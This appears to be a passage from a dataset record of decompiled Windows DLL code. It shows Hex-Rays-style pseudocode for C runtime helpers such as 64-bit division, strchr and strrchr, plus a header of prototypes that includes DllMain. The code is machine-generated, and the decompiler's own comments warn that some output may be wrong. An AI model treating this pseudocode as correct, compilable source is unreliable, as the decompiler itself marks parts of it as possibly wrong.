    "    return _set_errno_from_matherr(*(_DWORD *)a3);",
    "  if ( !__acrt_has_user_matherr() )",
    "    return _set_errno_from_matherr(*(_DWORD *)a3);",
    "  result = (_DWORD *)sub_100253D0(a3);",
    "  if ( !result )",
    "    return _set_errno_from_matherr(*(_DWORD *)a3);",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1002D277(double a1)",
    "{",
    "  int v1; // eax",
    "  int v2; // eax",
    "  int result; // eax",
    "  int v5; // [esp+4h] [ebp-8h]",
    "",
    "  if ( (HIDWORD(a1) & 0x7FF00000) == 0x7FF00000 )",
    "  {",
    "    v1 = sub_1002CEF0(SLODWORD(a1), SHIDWORD(a1)) - 1;",
    "    if ( v1 )",
    "    {",
    "      v2 = v1 - 1;",
    "      if ( !v2 )",
    "        return 4;",
    "      if ( v2 != 1 )",
    "        return 1;",
    "      return 2;",
    "    }",
    "    else",
    "    {",
    "      return 512;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( (HIDWORD(a1) & 0x7FF00000) != 0 || !(HIDWORD(a1) & 0xFFFFF | LODWORD(a1)) )",
    "    {",
    "      if ( a1 == 0.0 )",
    "      {",
    "        result = 64;",
    "        v5 = 32;",
    "      }",
    "      else",
    "      {",
    "        result = 256;",
    "        v5 = 8;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      result = 128;",
    "      v5 = 16;",
    "    }",
    "    if ( (HIWORD(a1) & 0x8000) != 0 )",
    "      return v5;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int _alloca_probe_16()",
    "{",
    "  return _alloca_probe();",
    "}",
    "",
    "",
    "int _alloca_probe_8()",
    "{",
    "  return _alloca_probe();",
    "}",
    "",
    "",
    "int __cdecl _FindPESection(int a1, unsigned int a2)",
    "{",
    "  unsigned int v2; // edx",
    "  int v3; // ecx",
    "  int result; // eax",
    "  unsigned int v5; // esi",
    "",
    "  v2 = 0;",
    "  v3 = a1 + *(_DWORD *)(a1 + 60);",
    "  result = v3 + *(unsigned __int16 *)(v3 + 20) + 24;",
    "  if ( !*(_WORD *)(v3 + 6) )",
    "    return 0;",
    "  while ( 1 )",
    "  {",
    "    v5 = *(_DWORD *)(result + 12);",
    "    if ( a2 >= v5 && a2 < v5 + *(_DWORD *)(result + 8) )",
    "      break;",
    "    ++v2;",
    "    result += 40;",
    "    if ( v2 >= *(unsigned __int16 *)(v3 + 6) )",
    "      return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "BOOL __cdecl _IsNonwritableInCurrentImage(int a1)",
    "{",
    "  int PESection; // eax",
    "",
    "  return _ValidateImageBase(0x10000000)",
    "      && (PESection = _FindPESection(0x10000000, a1 - 0x10000000)) != 0",
    "      && *(int *)(PESection + 36) >= 0;",
    "}",
    "",
    "",
    "BOOL __cdecl _ValidateImageBase(int a1)",
    "{",
    "  int v1; // ecx",
    "",
    "  if ( *(_WORD *)a1 == 23117 && (v1 = a1 + *(_DWORD *)(a1 + 60), *(_DWORD *)v1 == 17744) )",
    "    return *(_WORD *)(v1 + 24) == 267;",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "unsigned int __stdcall _aulldvrm(unsigned __int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 v2; // rtt",
    "  unsigned int v3; // esi",
    "  unsigned int v4; // ecx",
    "  unsigned int v5; // ebx",
    "  unsigned __int64 v6; // rax",
    "  char v7; // cf",
    "  unsigned __int64 v8; // rax",
    "",
    "  if ( HIDWORD(a2) )",
    "  {",
    "    v4 = HIDWORD(a2);",
    "    v5 = a2;",
    "    v6 = a1;",
    "    do",
    "    {",
    "      v7 = v4 & 1;",
    "      v4 >>= 1;",
    "      v5 = (v5 >> 1) | (v7 << 31);",
    "      v6 >>= 1;",
    "    }",
    "    while ( v4 );",
    "    v3 = v6 / v5;",
    "    v8 = v3 * (unsigned __int64)(unsigned int)a2;",
    "    if ( __CFADD__(HIDWORD(a2) * v3, HIDWORD(v8)) || (HIDWORD(v8) = (a2 * (unsigned __int64)v3) >> 32, v8 > a1) )",
    "      --v3;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v2) = a1;",
    "    HIDWORD(v2) = HIDWORD(a1) % (unsigned int)a2;",
    "    return v2 / (unsigned int)a2;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "int __stdcall _alldiv(unsigned __int64 a1, __int64 a2)",
    "{",
    "  int v2; // edi",
    "  int v3; // eax",
    "  unsigned __int64 v4; // rtt",
    "  __int64 v5; // rax",
    "  unsigned __int64 v6; // rcx",
    "  unsigned __int64 v7; // rax",
    "  unsigned int v8; // esi",
    "  unsigned __int64 v9; // rax",
    "",
    "  v2 = 0;",
    "  if ( (a1 & 0x8000000000000000uLL) != 0LL )",
    "  {",
    "    v2 = 1;",
    "    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);",
    "    LODWORD(a1) = -(int)a1;",
    "  }",
    "  v3 = HIDWORD(a2);",
    "  if ( a2 < 0 )",
    "  {",
    "    ++v2;",
    "    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);",
    "    HIDWORD(a2) = v3;",
    "    LODWORD(a2) = -(int)a2;",
    "  }",
    "  if ( v3 )",
    "  {",
    "    v6 = __PAIR64__(v3, a2);",
    "    v7 = a1;",
    "    do",
    "    {",
    "      v6 >>= 1;",
    "      v7 >>= 1;",
    "    }",
    "    while ( HIDWORD(v6) );",
    "    v8 = v7 / (unsigned int)v6;",
    "    v9 = v8 * (unsigned __int64)(unsigned int)a2;",
    "    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )",
    "      --v8;",
    "    v5 = v8;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v4) = a1;",
    "    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;",
    "    LODWORD(v5) = v4 / (unsigned int)a2;",
    "    HIDWORD(v5) = HIDWORD(a1) / (unsigned int)a2;",
    "  }",
    "  if ( v2 == 1 )",
    "    return -v5;",
    "  return v5;",
    "}",
    "",
    "",
    "void *__usercall _alloca_probe@<eax>(unsigned int a1@<eax>, int a2@<ecx>)",
    "{",
    "  unsigned int v2; // ecx",
    "  unsigned int i; // eax",
    "  int v5; // [esp-4h] [ebp-4h] BYREF",
    "  _UNKNOWN *retaddr; // [esp+0h] [ebp+0h] BYREF",
    "",
    "  v5 = a2;",
    "  v2 = ~((unsigned int)((unsigned int)&retaddr - (unsigned __int64)a1) >> 32) & ((unsigned int)&retaddr - a1);",
    "  for ( i = (unsigned int)&v5 & 0xFFFFF000; v2 < i; i -= 4096 )",
    "    ;",
    "  return retaddr;",
    "}",
    "",
    "",
    "unsigned __int64 __stdcall _allmul(__int64 a1, __int64 a2)",
    "{",
    "  if ( HIDWORD(a1) | HIDWORD(a2) )",
    "    return a1 * a2;",
    "  else",
    "    return (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;",
    "}",
    "",
    "",
    "int __stdcall _alldvrm(unsigned __int64 a1, __int64 a2)",
    "{",
    "  int v2; // edi",
    "  int v3; // eax",
    "  unsigned __int64 v4; // rtt",
    "  int v5; // esi",
    "  unsigned __int64 v6; // rcx",
    "  unsigned __int64 v7; // rax",
    "  unsigned __int64 v8; // rax",
    "  int result; // eax",
    "",
    "  v2 = 0;",
    "  if ( (a1 & 0x8000000000000000uLL) != 0LL )",
    "  {",
    "    v2 = 1;",
    "    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);",
    "    LODWORD(a1) = -(int)a1;",
    "  }",
    "  v3 = HIDWORD(a2);",
    "  if ( a2 < 0 )",
    "  {",
    "    ++v2;",
    "    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);",
    "    HIDWORD(a2) = v3;",
    "    LODWORD(a2) = -(int)a2;",
    "  }",
    "  if ( v3 )",
    "  {",
    "    v6 = __PAIR64__(v3, a2);",
    "    v7 = a1;",
    "    do",
    "    {",
    "      v6 >>= 1;",
    "      v7 >>= 1;",
    "    }",
    "    while ( HIDWORD(v6) );",
    "    v5 = v7 / (unsigned int)v6;",
    "    v8 = (unsigned int)v5 * (unsigned __int64)(unsigned int)a2;",
    "    if ( __CFADD__(HIDWORD(a2) * v5, HIDWORD(v8))",
    "      || (HIDWORD(v8) = (a2 * (unsigned __int64)(unsigned int)v5) >> 32, v8 > a1) )",
    "    {",
    "      --v5;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v4) = a1;",
    "    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;",
    "    v5 = v4 / (unsigned int)a2;",
    "  }",
    "  result = v5;",
    "  if ( v2 == 1 )",
    "    return -v5;",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 __stdcall _allrem(unsigned __int64 a1, __int64 a2)",
    "{",
    "  int v2; // edi",
    "  int v3; // eax",
    "  unsigned __int64 v4; // rtt",
    "  unsigned __int64 result; // rax",
    "  unsigned __int64 v6; // rcx",
    "  unsigned __int64 v7; // rax",
    "  unsigned int v8; // eax",
    "  int v9; // ecx",
    "  bool v10; // cf",
    "  unsigned __int64 v11; // rax",
    "",
    "  v2 = 0;",
    "  if ( (a1 & 0x8000000000000000uLL) != 0LL )",
    "  {",
    "    v2 = 1;",
    "    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);",
    "    LODWORD(a1) = -(int)a1;",
    "  }",
    "  v3 = HIDWORD(a2);",
    "  if ( a2 < 0 )",
    "  {",
    "    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);",
    "    HIDWORD(a2) = v3;",
    "    LODWORD(a2) = -(int)a2;",
    "  }",
    "  if ( !v3 )",
    "  {",
    "    LODWORD(v4) = a1;",
    "    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;",
    "    result = v4 % (unsigned int)a2;",
    "    if ( v2 - 1 < 0 )",
    "      return result;",
    "    return -(__int64)result;",
    "  }",
    "  v6 = __PAIR64__(v3, a2);",
    "  v7 = a1;",
    "  do",
    "  {",
    "    v6 >>= 1;",
    "    v7 >>= 1;",
    "  }",
    "  while ( HIDWORD(v6) );",
    "  v8 = v7 / (unsigned int)v6;",
    "  v9 = HIDWORD(a2) * v8;",
    "  v11 = (unsigned int)a2 * (unsigned __int64)v8;",
    "  v10 = __CFADD__(v9, HIDWORD(v11));",
    "  HIDWORD(v11) += v9;",
    "  if ( v10 || v11 > a1 )",
    "    v11 -= a2;",
    "  result = v11 - a1;",
    "  if ( v2 - 1 < 0 )",
    "    return -(__int64)result;",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 __usercall _aullshr@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)",
    "{",
    "  if ( a2 >= 0x40u )",
    "    return 0;",
    "  else",
    "    return a1 >> a2;",
    "}",
    "",
    "",
    "int __usercall _allshl@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)",
    "{",
    "  __int64 v2; // rax",
    "",
    "  if ( a2 >= 0x40u )",
    "  {",
    "    LODWORD(v2) = 0;",
    "  }",
    "  else if ( a2 >= 0x20u )",
    "  {",
    "    LODWORD(v2) = 0;",
    "  }",
    "  else",
    "  {",
    "    return a1 << (a2 & 0x1F);",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "char *__cdecl strrchr(const char *Str, int Ch)",
    "{",
    "  char *v2; // edi",
    "  __m128 v3; // xmm3",
    "  __m128i v4; // xmm3",
    "  int v5; // eax",
    "  const __m128i *v6; // edi",
    "  char *v7; // edx",
    "  __m128i v8; // xmm1",
    "  __m128i v9; // xmm2",
    "  __m128i v10; // xmm1",
    "  int v11; // ecx",
    "  unsigned int v12; // ecx",
    "  unsigned int v13; // eax",
    "  char *v14; // eax",
    "  unsigned int v15; // ecx",
    "  unsigned int v16; // eax",
    "  char *result; // eax",
    "  __m128i v18; // xmm0",
    "  bool v19; // zf",
    "  char *v20; // ecx",
    "  __m128i *v21; // eax",
    "  unsigned int i; // edi",
    "  __m128i v23; // xmm0",
    "  unsigned int v24; // edx",
    "  unsigned int v25; // ecx",
    "  const char *v26; // edi",
    "  char *v27; // edi",
    "",
    "  if ( dword_1004014C )",
    "  {",
    "    v2 = (char *)Str;",
    "    if ( (unsigned int)dword_1004014C > 1 )",
    "    {",
    "      if ( (_BYTE)Ch )",
    "      {",
    "        result = 0;",
    "        if ( ((unsigned __int8)Str & 0xF) != 0 )",
    "        {",
    "          while ( 1 )",
    "          {",
    "            if ( (unsigned __int8)*v2 == (unsigned __int8)Ch )",
    "              result = v2;",
    "            if ( !*v2 )",
    "              break;",
    "            if ( ((unsigned __int8)++v2 & 0xF) == 0 )",
    "              goto strrchr_sttni_aligned;",
    "          }",
    "        }",
    "        else",
    "        {",
    "strrchr_sttni_aligned:",
    "          v18 = _mm_cvtsi32_si128((unsigned __int8)Ch);",
    "          do",
    "          {",
    "            v2 += 16;",
    "            v19 = _mm_cmpistrz(v18, *((__m128i *)v2 - 1), 64);",
    "            v20 = &v2[_mm_cmpistri(v18, *((__m128i *)v2 - 1), 64) - 16];",
    "            if ( _mm_cmpistrc(v18, *((__m128i *)v2 - 1), 64) )",
    "              result = v20;",
    "          }",
    "          while ( !v19 );",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v21 = (__m128i *)((unsigned int)Str & 0xFFFFFFF0);",
    "        for ( i = (-1 << ((unsigned __int8)Str & 0xF))",
    "                & _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *(__m128i *)((unsigned int)Str & 0xFFFFFFF0)));",
    "              !i;",
    "              i = _mm_movemask_epi8(v23) )",
    "        {",
    "          v23 = _mm_cmpeq_epi8((__m128i)0LL, v21[1]);",
    "          ++v21;",
    "        }",
    "        _BitScanForward(&v24, i);",
    "        return &v21->m128i_i8[v24];",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v3 = (__m128)_mm_shufflelo_epi16(_mm_cvtsi32_si128((unsigned __int8)Ch | ((unsigned __int8)Ch << 8)), 0);",
    "      v4 = (__m128i)_mm_movelh_ps(v3, v3);",
    "      v5 = -1 << ((unsigned __int8)Str & 0xF);",
    "      v6 = (const __m128i *)&Str[-((unsigned __int8)Str & 0xF)];",
    "      v7 = 0;",
    "      while ( 1 )",
    "      {",
    "        v8 = _mm_loadu_si128(v6);",
    "        v9 = _mm_cmpeq_epi8((__m128i)0LL, v8);",
    "        v10 = _mm_cmpeq_epi8(v8, v4);",
    "        v11 = v5 & _mm_movemask_epi8(v9);",
    "        if ( v11 )",
    "          break;",
    "        v12 = v5 & _mm_movemask_epi8(v10);",
    "        _BitScanReverse(&v13, v12);",
    "        v14 = &v6->m128i_i8[v13];",
    "        if ( v12 )",
    "          v7 = v14;",
    "        v5 = -1;",
    "        ++v6;",
    "      }",
    "      v15 = v5 & _mm_movemask_epi8(v10) & (((-2 * v11) & (2 * v11)) - 1);",
    "      _BitScanReverse(&v16, v15);",
    "      result = &v6->m128i_i8[v16];",
    "      if ( !v15 )",
    "        return v7;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v25 = strlen(Str) + 1;",
    "    v26 = &Str[v25 - 1];",
    "    do",
    "    {",
    "      if ( !v25 )",
    "        break;",
    "      v19 = *v26-- == (unsigned __int8)Ch;",
    "      --v25;",
    "    }",
    "    while ( !v19 );",
    "    v27 = (char *)(v26 + 1);",
    "    if ( *v27 == (_BYTE)Ch )",
    "      return v27;",
    "    else",
    "      return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char *__cdecl strchr(const char *Str, int Val)",
    "{",
    "  __m128 v2; // xmm3",
    "  __m128i v3; // xmm3",
    "  int v4; // eax",
    "  const __m128i *i; // edx",
    "  __m128i v6; // xmm1",
    "  unsigned int v7; // ecx",
    "  unsigned int v8; // eax",
    "  char *result; // eax",
    "  const char *v10; // edx",
    "  char v11; // cl",
    "  int v12; // ecx",
    "  int v13; // esi",
    "  int v14; // eax",
    "  unsigned int v15; // eax",
    "  unsigned int v16; // eax",
    "  unsigned int v17; // eax",
    "",
    "  if ( dword_1004014C )",
    "  {",
    "    v2 = (__m128)_mm_shufflelo_epi16(",
    "                   _mm_cvtsi32_si128(((unsigned __int8)Val << 8) | (unsigned int)(unsigned __int8)Val),",
    "                   0);",
    "    v3 = (__m128i)_mm_movelh_ps(v2, v2);",
    "    v4 = -1 << ((unsigned __int8)Str & 0xF);",
    "    for ( i = (const __m128i *)&Str[-((unsigned __int8)Str & 0xF)]; ; ++i )",
    "    {",
    "      v6 = _mm_loadu_si128(i);",
    "      v7 = v4 & _mm_movemask_epi8(_mm_or_si128(_mm_cmpeq_epi8((__m128i)0LL, v6), _mm_cmpeq_epi8(v6, v3)));",
    "      if ( v7 )",
    "        break;",
    "      v4 = -1;",
    "    }",
    "    _BitScanForward(&v8, v7);",
    "    result = &i->m128i_i8[v8];",
    "    if ( (unsigned __int8)_mm_cvtsi128_si32(v3) != *result )",
    "      return 0;",
    "  }",
    "  else",
    "  {",
    "    v10 = Str;",
    "    if ( ((unsigned __int8)Str & 3) == 0 )",
    "      goto main_loop;",
    "    do",
    "    {",
    "      v11 = *v10++;",
    "      if ( v11 == (_BYTE)Val )",
    "        return (char *)(v10 - 1);",
    "      if ( !v11 )",
    "        return 0;",
    "    }",
    "    while ( ((unsigned __int8)v10 & 3) != 0 );",
    "    while ( 1 )",
    "    {",
    "main_loop:",
    "      while ( 1 )",
    "      {",
    "        v12 = (((unsigned __int8)Val << 8)",
    "             | (unsigned __int8)Val",
    "             | ((((unsigned __int8)Val << 8) | (unsigned __int8)Val) << 16))",
    "            ^ *(_DWORD *)v10;",
    "        v13 = *(_DWORD *)v10 + 2130640639;",
    "        v14 = v13 ^ ~*(_DWORD *)v10;",
    "        v10 += 4;",
    "        if ( (((v12 + 2130640639) ^ ~v12) & 0x81010100) != 0 )",
    "          break;",
    "        v15 = v14 & 0x81010100;",
    "        if ( v15 && ((v15 & 0x1010100) != 0 || (v13 & 0x80000000) == 0) )",
    "          return 0;",
    "      }",
    "      v16 = *((_DWORD *)v10 - 1);",
    "      if ( (_BYTE)v16 == (_BYTE)Val )",
    "        break;",
    "      if ( !(_BYTE)v16 )",
    "        return 0;",
    "      if ( BYTE1(v16) == (_BYTE)Val )",
    "        return (char *)(v10 - 3);",
    "      if ( !BYTE1(v16) )",
    "        return 0;",
    "      v17 = HIWORD(v16);",
    "      if ( (_BYTE)v17 == (_BYTE)Val )",
    "        return (char *)(v10 - 2);",
    "      if ( !(_BYTE)v17 )",
    "        return 0;",
    "      if ( BYTE1(v17) == (_BYTE)Val )",
    "        return (char *)(v10 - 1);",
    "      if ( !BYTE1(v17) )",
    "        return 0;",
    "    }",
    "    return (char *)(v10 - 4);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _filter_x86_sse2_floating_point_exception_default(int a1)",
    "{",
    "  unsigned __int16 v2; // [esp+0h] [ebp-4h]",
    "",
    "  if ( dword_1004014C >= 1 && (a1 == -1073741132 || a1 == -1073741131) )",
    "  {",
    "    v2 = _mm_getcsr();",
    "    if ( (((unsigned __int8)v2 ^ 0x3F) & 0x81) == 0 )",
    "      return -1073741680;",
    "    if ( ((v2 ^ 0x3F) & 0x204) == 0 )",
    "      return -1073741682;",
    "    if ( ((v2 ^ 0x3F) & 0x102) == 0 )",
    "      return -1073741680;",
    "    if ( ((v2 ^ 0x3F) & 0x408) == 0 )",
    "      return -1073741679;",
    "    if ( ((v2 ^ 0x3F) & 0x810) == 0 )",
    "      return -1073741677;",
    "    if ( ((v2 ^ 0x3F) & 0x1020) == 0 )",
    "      return -1073741681;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "void __cdecl sub_1002F5B0()",
    "{",
    "  _BYTE *v0; // edx",
    "",
    "  if ( (unsigned int)dword_100408C4 > 0xF )",
    "  {",
    "    v0 = dword_100408B0;",
    "    if ( (unsigned int)(dword_100408C4 + 1) >= 0x1000 )",
    "    {",
    "      v0 = (_BYTE *)*((_DWORD *)dword_100408B0 - 1);",
    "      if ( (unsigned int)((_BYTE *)dword_100408B0 - v0 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_100154EB(v0);",
    "  }",
    "  dword_100408C0 = 0;",
    "  dword_100408C4 = 15;",
    "  LOBYTE(dword_100408B0) = 0;",
    "}",
    "",
    "",
    "void __cdecl sub_1002F610()",
    "{",
    "  VariantClear(&pvarg);",
    "}",
    "",
    ""
  ],
  "h_code": [
    "#include <windows.h>",
    "#include <stdint.h>",
    "#include <stdio.h>",
    "",
    "#include \"defs.h\"",
    "",
    "void JUMPOUT(int a) {",
    "}",
    "",
    "unsigned int _bss_start__ = 0;",
    "unsigned int __cxa_finalize = 0;",
    "int sub_10001000();",
    "int sub_10001020();",
    "char *sub_10001030();",
    "unsigned __int8 sub_100011A0();",
    "char *__thiscall sub_100013F0(char *this, int a2);",
    "const char *__thiscall sub_10001420(_DWORD *this);",
    "char *__thiscall sub_10001430(char *Block, char a2);",
    "// Microsoft VisualC 14/net runtime",
    "int __thiscall unknown_libname_1(_DWORD *this);",
    "char *__thiscall sub_10001480(char *this);",
    "void  sub_100014A0();",
    "char *__thiscall sub_100014C0(char *this, int a2);",
    "char *__thiscall sub_10001500(char *this, int a2);",
    "void  sub_10001540();",
    "_DWORD *__stdcall sub_10001550(_DWORD *Src, char *a2, int a3);",
    "void __thiscall sub_100017E0(_DWORD *this);",
    "_DWORD *__thiscall sub_10001830(_DWORD *this, int a2);",
    "_DWORD *__thiscall sub_10001880(_DWORD *this, void *Src);",
    "void *__thiscall sub_100018C0(_DWORD *this, void *Src, size_t Size);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_100019A0(void **Src, int a2, int a3, char a4);",
    "BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);",
    "_OWORD *__thiscall sub_10001AF0(_OWORD *this);",
    "int sub_10002FE0();",
    "void **__thiscall sub_100030B0(void **this, void *Src, size_t Size);",
    "int sub_100031E0();",
    "_DWORD *__stdcall sub_10003290(_DWORD *a1, _DWORD *Src, int a3, int a4);",
    "_DWORD *__thiscall sub_10003490(_DWORD *this);",
    "_DWORD *__thiscall sub_100034A0(_DWORD *this, _QWORD *a2);",
    "void  sub_10003520();",
    "void  sub_10003530();",
    "void *sub_10003540();",
    "int sub_10003550(char *Buffer, size_t BufferCount, char *Format, ...);",
    "_DWORD *__stdcall sub_10003590(_DWORD *a1);",
    "_DWORD *__stdcall sub_10003A60(_DWORD *a1);",
    "WCHAR *__stdcall sub_10004100(WCHAR *a1);",
    "WCHAR *__stdcall sub_10005470(WCHAR *a1);",
    "_DWORD *__stdcall sub_100067E0(_DWORD *a1);",
    "int __stdcall sub_10008110(int a1);",
    "_DWORD *__stdcall sub_10008500(_DWORD *Src);",
    "_DWORD *__stdcall sub_10008890(_DWORD *Src);",
    "int __stdcall sub_10008CD0(int a1);",
    "int __userpurge sub_10008F90@<eax>(int a1@<ecx>, size_t a2@<ebx>, int a3);",
    "_DWORD *__thiscall sub_10009D00(_DWORD *this);",
    "int __thiscall sub_10009D10(_DWORD *this);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "size_t *__thiscall sub_10009D70(size_t *this, _DWORD *a2);",
    "_DWORD *__thiscall sub_10009E70(_DWORD *this, _DWORD *a2);",
    "_DWORD *__thiscall sub_10009F60(_DWORD *this, void *Src, size_t Size);",
    "int __fastcall sub_10009FC0(int a1, _DWORD *a2, const void **Src);",
    "int __fastcall sub_1000A070(int a1, const char *a2, _DWORD *Src);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "_DWORD *__thiscall sub_1000A170(_DWORD *this, void *Src, unsigned int a3);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_1000A260(void **Src, unsigned int a2, int a3, const void *a4, size_t Size);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_1000A3C0(void **this, unsigned int a2, int a3, const void *a4);",
    "char **__thiscall sub_1000A4E0(char **this, int a2, _DWORD *a3, _DWORD *Src);",
    "_DWORD *__thiscall sub_1000A6C0(_DWORD *this, int a2, int a3, const void *a4, size_t Size, const void *a6, size_t a7);",
    "void **__thiscall sub_1000A7B0(void **Src, unsigned int a2, int a3, int a4, const void *a5, size_t Size);",
    "int sub_1000A900(wchar_t *Buffer, unsigned int a2, wchar_t *Format, ...);",
    "int sub_1000A970();",
    "int __stdcall sub_1000AA30(int a1, CHAR *lpMultiByteStr, int a3, int a4, int a5, int cbMultiByte, unsigned int a7);",
    "int __stdcall sub_1000AD50(int a1, WCHAR *lpWideCharStr, int a3, int a4, int a5, int cchWideChar, unsigned int a7);",
    "_DWORD *__stdcall sub_1000B000(_DWORD *a1, _DWORD *a2, int a3, int a4, int a5, unsigned int a6, unsigned int a7);",
    "FILE *__stdcall sub_1000B270(FILE *a1, char *FileName, int a3, int a4, int a5, int a6, unsigned int a7);",
    "_DWORD *__stdcall sub_1000B970(",
    "        _DWORD *a1,",
    "        _DWORD *Block,",
    "        int a3,",
    "        int a4,",
    "        int a5,",
    "        int a6,",
    "        unsigned int a7,",
    "        _DWORD *a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        int a12,",
    "        unsigned int a13);",
    "void *__stdcall sub_1000BA90(void *a1, _DWORD *Src, int a3, int a4, int a5, size_t Size, unsigned int a7);",
    "char __stdcall sub_1000C310(",
    "        _DWORD *a1,",
    "        int a2,",
    "        int a3,",
    "        int a4,",
    "        int a5,",
    "        unsigned int a6,",
    "        _DWORD *a7,",
    "        int a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        unsigned int a12);",
    "int sub_1000C790();",
    "CHAR *__thiscall sub_1000CE40(_BYTE *this, CHAR *lpPathName);",
    "// positive sp value has been detected, the output may be wrong!",
    "char sub_1000D1E0();",
    "char __thiscall sub_1000D290(_BYTE *this);",
    "char __usercall sub_1000F100@<al>(int a1@<ecx>, size_t a2@<ebx>);",
    "_DWORD *__stdcall sub_100113C0(_DWORD *a1);",
    "char __usercall VelocitySpeed@<al>(size_t a1@<ebx>);",
    "char LOPP();",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_100116D0(void **Src, unsigned int a2, int a3, const void *a4, int a5);",
    "_DWORD *__thiscall sub_10011850(_DWORD *this, int a2, int a3, const void *a4, int a5, const void *a6, int a7);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_10011950(void **Src, unsigned int a2, int a3, int a4, int a5, int a6);",
    "void  sub_10011AB0();",
    "int __stdcall sub_10011AC0(int a1, __int128 Block, __int64 a3, char a4);",
    "char __thiscall sub_10011D60(",
    "        _DWORD **this,",
    "        int a2,",
    "        int a3,",
    "        void *a4,",
    "        HMODULE a5,",
    "        void *a6,",
    "        _BYTE *a7,",
    "        double *a8,",
    "        HMODULE a9);",
    "int __stdcall sub_10014450(_DWORD *Block, int a2);",
    "void __fastcall sub_10014490(int a1, int a2);",
    "size_t *__thiscall sub_10014500(int *this, int a2, _DWORD *a3);",
    "int __fastcall sub_10014720(int a1, int a2, int a3);",
    "int __thiscall sub_10014790(int *this);",
    "char __stdcall sub_10014800(OLECHAR *psz, int a2, int a3, int a4, int a5, unsigned int a6);",
    "_DWORD *__thiscall sub_10014B54(_DWORD *this);",
    "std::exception *__thiscall std::exception::exception(std::exception *this, const char *a2);",
    "char *__thiscall sub_10014BA1(char *this, int a2);",
    "std::exception *__thiscall sub_10014BBC(std::exception *this, char *a2);",
    "char *__thiscall sub_10014BDB(char *this, int a2);",
    "std::exception *__thiscall sub_10014BF6(std::exception *this, char *a2);",
    "char *__thiscall sub_10014C15(char *this, int a2);",
    "char *__thiscall sub_10014C30(char *this, int a2);",
    "std::exception *__thiscall sub_10014C4B(std::exception *this, char *a2);",
    "char *__thiscall sub_10014C6A(char *this, int a2);",
    "// Microsoft VisualC 14/net runtime",
    "char *__thiscall unknown_libname_2(char *Block, char a2);",
    "void __cdecl  sub_10014CB2(char *a1);",
    "void __cdecl  sub_10014CD2(char *a1);",
    "void __cdecl  sub_10014CF2(char *a1);",
    "_DWORD *__thiscall std::_System_error::_System_error(_DWORD *this, int a2, int a3, _DWORD *a4);",
    "int __thiscall sub_10014D7E(int this, int a2);",
    "std::exception *__thiscall sub_10014DA8(std::exception *this, char *a2);",
    "_DWORD *__thiscall sub_10014DD0(_DWORD *this, int a2);",
    "// Microsoft VisualC 14/net runtime",
    "_DWORD *__thiscall unknown_libname_3(_DWORD *this, int a2, int a3, void *a4);",
    "bool __cdecl std::operator==(_DWORD *a1, _DWORD *a2);",
    "std::_Iostream_error_category2 *__thiscall std::_Iostream_error_category2::`scalar deleting destructor'(",
    "        std::_Iostream_error_category2 *this,",
    "        char a2);",
    "// Microsoft VisualC 14/net runtime",
    "char *__thiscall unknown_libname_4(char *Block, char a2);",
    "_DWORD *__cdecl std::_System_error::_Makestr(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);",
    "void __cdecl  std::_Throw_Cpp_error(int a1);",
    "_DWORD *__thiscall std::error_category::default_error_condition(void *this, _DWORD *a2, int a3);",
    "bool __thiscall std::error_category::equivalent(std::error_category *this, const struct std::error_code *a2, int a3);",
    "bool __thiscall std::error_category::equivalent(",
    "        std::error_category *this,",
    "        int a2,",
    "        const struct std::error_condition *a3);",
    "void *(__thiscall ***sub_10014FB9())(std::_Iostream_error_category2 *__hidden this, char);",
    "_DWORD *__stdcall std::_Generic_error_category::message(_DWORD *a1, int a2);",
    "int __thiscall std::error_code::message(_DWORD **this, int a2);",
    "const char *sub_10015004();",
